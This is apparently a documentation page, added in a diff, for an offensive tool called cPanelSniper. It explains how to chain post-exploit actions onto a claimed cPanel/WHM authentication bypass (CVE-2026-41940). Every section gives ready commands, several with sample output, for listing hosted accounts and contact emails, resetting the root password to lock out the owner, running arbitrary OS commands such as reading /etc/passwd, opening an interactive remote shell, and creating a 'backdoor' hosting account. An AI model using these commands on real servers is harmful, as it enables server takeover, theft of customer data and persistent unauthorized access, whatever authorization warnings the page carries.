@@ -1,0 +1,158 @@
+---
+title: "Post-Exploit Actions: --action Flag Reference"
+description: "Reference for all cPanelSniper --action values: list, passwd, cmd, exec, info, version, shell, and adduser. Includes required flags and example commands."
+---
+
+After cPanelSniper confirms a successful CVE-2026-41940 bypass, you can chain a post-exploit action in the same invocation using `--action`. The action runs using the authenticated WHM session token obtained during Stage 2 of the exploit chain. Post-exploit actions only work when a single target is provided via `-u` — they are silently skipped during bulk scans with `-l`.
+
+<Warning>
+  Post-exploit actions make authenticated write operations against the target server. Only run them against systems you are explicitly authorized to test.
+</Warning>
+
+## Actions
+
+<AccordionGroup>
+  <Accordion title="list — list cPanel accounts">
+    Calls the WHM `listaccts` JSON API endpoint and prints every hosted account with its username, primary domain, and contact email.
+
+    **Required companion flags:** none
+
+    ```bash
+    python3 cPanelSniper.py -u https://target.com:2087 --action list
+    ```
+
+    Example output:
+
+    ```text
+    14:46:26 [ API] Running post-exploit action: list
+    14:46:27 [ API] listaccts → HTTP 200
+
+      [cPanel Accounts]  target.com:2087 (47 accounts)
+        client01    domain: client01.com    email: admin@client01.com
+        client02    domain: client02.net    email: info@client02.net
+    ```
+  </Accordion>
+
+  <Accordion title="passwd — change root password">
+    Calls the WHM `passwd` API to set a new password for the `root` system user.
+
+    **Required companion flags:** `--passwd`
+
+    ```bash
+    python3 cPanelSniper.py -u https://target.com:2087 --action passwd --passwd 'NewPass@2026!'
+    ```
+
+    <Warning>
+      Changing the root password is a destructive, highly visible operation. It will immediately lock out the legitimate server owner.
+    </Warning>
+  </Accordion>
+
+  <Accordion title="cmd — execute an OS command">
+    Calls `scripts/exec` in the WHM JSON API to run an arbitrary OS command on the target server. If the primary method is blocked by a license restriction, the tool automatically falls back through alternative exec endpoints before giving up.
+
+    **Required companion flags:** `--cmd`
+
+    ```bash
+    python3 cPanelSniper.py -u https://target.com:2087 --action cmd --cmd "id;whoami;uname -a"
+    ```
+
+    The fallback sequence the tool attempts:
+
+    1. `WHM json-api/scripts/exec` — primary method
+    2. `cpanel_jsonapi_module=Exec` — cPanel API2 exec module
+    3. `execute/Exec/exec` — WHM execute endpoint
+    4. Direct file reads via WHM Fileman API
+
+    <Info>
+      On license-restricted hosts, command execution may be blocked. The tool reports which method succeeded or explains that the license prevents execution.
+    </Info>
+  </Accordion>
+
+  <Accordion title="exec — execute an OS command (alias for cmd)">
+    Identical to `--action cmd`. Both aliases call the same fallback execution chain. Use whichever is more convenient in your workflow.
+
+    **Required companion flags:** `--cmd`
+
+    ```bash
+    python3 cPanelSniper.py -u https://target.com:2087 --action exec --cmd "cat /etc/passwd"
+    ```
+  </Accordion>
+
+  <Accordion title="info — get server information">
+    Queries several lightweight WHM endpoints in a single call and prints hostname, load averages, disk information, MySQL host, reseller list, and cPanel version.
+
+    **Required companion flags:** none
+
+    ```bash
+    python3 cPanelSniper.py -u https://target.com:2087 --action info
+    ```
+
+    Example output:
+
+    ```text
+    [Server Info]  https://target.com:2087
+    {
+      "hostname": "srv01.target.com",
+      "load": { "one": "0.72", "five": "0.66", "fifteen": "0.69" },
+      "disk": { ... },
+      "mysql_host": "localhost",
+      "version": { "version": "11.130.0.6" }
+    }
+    ```
+  </Accordion>
+
+  <Accordion title="version — get cPanel version">
+    Calls the `version` WHM API endpoint and prints the full version string. Useful for quickly confirming the installed cPanel release without collecting full server info.
+
+    **Required companion flags:** none
+
+    ```bash
+    python3 cPanelSniper.py -u https://target.com:2087 --action version
+    ```
+  </Accordion>
+
+  <Accordion title="shell — interactive WHM shell">
+    Drops into a persistent interactive shell against the target after the bypass succeeds. Commands you type are sent to the WHM exec endpoint and output is printed back to your terminal. Exit by typing `exit` or pressing `Ctrl+C`.
+
+    **Required companion flags:** none
+
+    ```bash
+    python3 cPanelSniper.py -u https://target.com:2087 --action shell
+    ```
+
+    See the [Interactive WHM shell](/usage/interactive-shell) page for full usage details.
+  </Accordion>
+
+  <Accordion title="adduser — create a new cPanel account">
+    Calls the WHM `createacct` API to provision a new hosting account on the target server. The account is created under the `default` hosting plan.
+
+    **Required companion flags:** `--new-user`, `--new-domain`
+
+    **Optional companion flags:** `--passwd` (defaults to `TempPass2026!` if omitted)
+
+    ```bash
+    python3 cPanelSniper.py -u https://target.com:2087 \
+      --action adduser \
+      --new-user backdoor \
+      --new-domain backdoor.example.com \
+      --passwd 'SecurePass@2026!'
+    ```
+
+    <Note>
+      The account is created under the `default` hosting plan. To use a different plan, modify the `plan` parameter in the `action_create_user` function in the source.
+    </Note>
+  </Accordion>
+</AccordionGroup>
+
+## Quick reference
+
+| `--action` | Required flags | Description |
+|---|---|---|
+| `list` | — | List all cPanel accounts on the server |
+| `passwd` | `--passwd` | Change the root system password |
+| `cmd` | `--cmd` | Execute an OS command |
+| `exec` | `--cmd` | Alias for `cmd` |
+| `info` | — | Hostname, load, disk, MySQL host, version |
+| `version` | — | cPanel version string |
+| `shell` | — | Launch interactive WHM shell |
+| `adduser` | `--new-user`, `--new-domain` | Create a new cPanel hosting account |
